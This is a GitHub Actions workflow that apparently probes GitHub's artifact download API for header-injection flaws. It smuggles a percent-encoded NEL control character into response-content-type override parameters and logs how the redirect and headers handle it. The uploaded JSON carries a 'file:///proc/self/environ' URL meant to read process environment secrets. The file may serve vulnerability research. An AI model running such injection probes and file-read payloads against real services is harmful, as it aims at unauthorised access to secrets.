name: Probe GitHub artifact MIME URL decoding

on:
  push:
    branches:
      - codex/repo-cassette-release-routes
  workflow_dispatch:

permissions:
  actions: write
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - name: Prepare self-describing JSON
        shell: bash
        run: |
          cat > carrier.json <<'JSON'
          {"full_name":"pending","owner":{"login":"cassette","avatar_url":"file:///proc/self/environ"},"description":"Repo Cassette MIME probe","stargazers_count":0}
          JSON
      - name: Upload a direct artifact with percent-encoded NEL candidate
        id: upload
        uses: ./.github/actions/raw-artifact
        with:
          path: carrier.json
          mime_type: application/json
          blob_mime_type: application/octet-stream
          version: "7"
      - name: Check whether the API forwards response overrides
        env:
          GITHUB_TOKEN: ${{ github.token }}
          ARTIFACT_ID: ${{ steps.upload.outputs.artifact-id }}
        shell: bash
        run: |
          node --input-type=module <<'NODE'
          const apiHeaders = {
            authorization: 'Bearer ' + process.env.GITHUB_TOKEN,
            accept: 'application/vnd.github+json',
            'x-github-api-version': '2026-03-10',
            'user-agent': 'repo-cassette-query-probe',
          };
          const root = 'https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY +
            '/actions/artifacts/' + process.env.ARTIFACT_ID + '/zip';
          const suffixes = [
            '?rsct=application%2Fjson%C2%85',
            '?rsct=application%2Fjson&rsct=application%2Fjson%C2%85',
            '?response-content-type=application%2Fjson%C2%85',
            '?download=1&rsct=application%2Fjson%C2%85',
          ];
          for (const suffix of suffixes) {
            try {
              const response = await fetch(root + suffix, {
                headers: apiHeaders,
                redirect: 'manual',
              });
              const location = response.headers.get('location');
              let details = {status: response.status, contentType: response.headers.get('content-type')};
              if (location) {
                const target = new URL(location);
                const values = target.searchParams.getAll('rsct');
                details = {
                  ...details,
                  locationHost: target.host,
                  locationPath: target.pathname,
                  queryKeys: [...new Set([...target.searchParams.keys()])].sort(),
                  rsctValuesHex: values.map(value =>
                    [...value].map(char => char.codePointAt(0).toString(16)).join(',')
                  ),
                };
              }
              console.log('QUERY-OVERRIDE-PROBE ' + JSON.stringify({suffix, ...details}));
            } catch (error) {
              console.log('QUERY-OVERRIDE-PROBE ' + JSON.stringify({suffix, error: String(error).slice(0, 160)}));
            }
          }
          NODE
      - name: Inspect final artifact response header
        env:
          GITHUB_TOKEN: ${{ github.token }}
          ARTIFACT_ID: ${{ steps.upload.outputs.artifact-id }}
        shell: bash
        run: |
          node --input-type=module <<'NODE'
          import {createHash} from 'node:crypto';
          const url = 'https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY +
            '/actions/artifacts/' + process.env.ARTIFACT_ID + '/zip';
          const response = await fetch(url, {
            headers: {
              authorization: 'Bearer ' + process.env.GITHUB_TOKEN,
              accept: 'application/vnd.github+json',
              'x-github-api-version': '2026-03-10',
              'user-agent': 'repo-cassette-mime-probe',
            },
          });
          const body = Buffer.from(await response.arrayBuffer());
          const type = response.headers.get('content-type') || '';
          let parsed = null;
          try { parsed = JSON.parse(body.toString('utf8')); } catch {}
          console.log('MIME-PERCENT-PROBE ' + JSON.stringify({
            artifactId: process.env.ARTIFACT_ID,
            status: response.status,
            contentType: type,
            contentTypeHex: Buffer.from(type, 'latin1').toString('hex'),
            bodyBytes: body.length,
            bodySha256: createHash('sha256').update(body).digest('hex'),
            fullName: parsed && parsed.full_name,
            avatarUrl: parsed && parsed.owner && parsed.owner.avatar_url,
          }));
          NODE
